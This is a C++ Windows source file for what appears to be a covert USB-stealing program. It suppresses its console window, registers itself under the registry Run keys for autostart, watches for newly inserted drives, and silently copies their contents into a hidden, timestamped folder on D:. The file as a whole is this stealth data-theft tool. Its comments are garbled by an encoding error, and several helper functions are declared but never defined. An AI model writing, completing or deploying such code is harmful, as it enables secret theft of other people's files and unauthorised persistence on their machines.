#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")	
#include <windows.h>
#include <string.h>
#include <string>
#include <stdlib.h>
#include <vector>
#include <algorithm>
#include <sstream>
#define MAX 500
using namespace std;


vector<int> currentdisks;
vector<int> newdisks;
char src[MAX] = "X:\\";
char dest[MAX] = "D:\\games\\";
char usbname[MAX];
char tar[MAX];
char regsrc[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";	//����ԱȨ��ע���,win7��һ���ɹ�
char regsrc2[] = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run";	//�û���¼Ȩ��ע���
string time;

UINT DiskType;
SYSTEMTIME localtime;
HANDLE hthread_hide = NULL;
HKEY hkey = NULL;

/*-------------------------------------------------------------------------------------------------------------------
void copy();					//���ƹ���
int diskstatus();				//û�仯����0, ��������1���˳�����2, ͬʱ����ά��currentdisks״̬
DWORD WINAPI hide(LPVOID);			//hide�߳�����cmd���ڣ�һ�����ּ������������
void gettime();					//��ȡʱ�书��
void autostart();				//�Զ���������
--------------------------------------------------------------------------*/

int main() {
	
	autostart();

	while (true) {
		int status = diskstatus();
		if (status == 1) {	//�����̷�
			for (int i = 0; i < newdisks.size(); i++) {
				gettime();
				sprintf(dest, "D:\\games\\");	//ÿ�ζ��ض��壬�����ַ��ۻ�
				string name = dest + time + "\\";
				sprintf(dest, name.c_str());
				src[0] = newdisks[i];
				::CreateThread(NULL, 0, hide, NULL, 0, NULL);
				copy();
				::SetFileAttributes(dest, FILE_ATTRIBUTE_HIDDEN);	//���ô��Ŀ¼Ϊ���أ�����������
			}
			newdisks.clear();
		}
		else	//�����̷�
			Sleep(500);

	}
	return 0;
}